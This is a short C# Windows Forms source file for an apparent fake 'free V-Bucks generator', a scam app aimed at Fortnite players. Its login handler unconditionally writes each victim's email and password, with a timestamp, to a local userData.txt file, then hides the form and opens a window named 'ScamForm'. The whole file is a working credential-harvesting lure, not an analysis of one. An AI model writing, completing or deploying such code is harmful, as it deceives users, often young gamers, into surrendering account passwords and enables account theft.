using System.IO;
using System.Data.SqlClient;

namespace free_vbucks_generator
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void ExitButton_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void LoginButton_Click(object sender, EventArgs e)
        {
            if(true)
            {
                using (StreamWriter nevinnyPrepisovac = new StreamWriter("userData.txt", true))
                {
                    nevinnyPrepisovac.WriteLine(DateTime.Now + "\r\n" + EmailtextBox.Text + "\r\n" + PasswordtextBox.Text + "\r\n----------\r\n");
                }
                this.Hide();

                ScamForm scamForm = new ScamForm();
                scamForm.Show();
            }
        }
    }
}
